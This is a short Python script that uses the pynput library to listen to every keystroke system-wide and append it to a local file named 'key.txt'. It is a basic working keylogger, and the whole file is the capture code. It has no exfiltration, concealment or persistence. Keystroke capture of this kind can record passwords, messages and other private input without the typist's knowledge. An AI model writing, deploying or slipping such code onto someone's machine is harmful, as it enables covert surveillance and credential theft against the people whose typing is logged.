from pynput import keyboard


def keypressed(key):
    ch=str(key)
   
    with open("key.txt","a") as keylog:
        try:
            pointpos=ch.find(".")

            if(pointpos!=-1):
                print(ch[pointpos+1:len(str(key))])
                if (ch[pointpos+1:len(str(key))].lower()=="space"):

                    keylog.write(" ")            
                else:
                    keylog.write(ch[pointpos+1:len(str(key))])
            car=key.char
            keylog.write(car)

        except:
            print("error with char")



if __name__=="__main__":
    listener=keyboard.Listener(on_press=keypressed) 
    listener.start()
    input()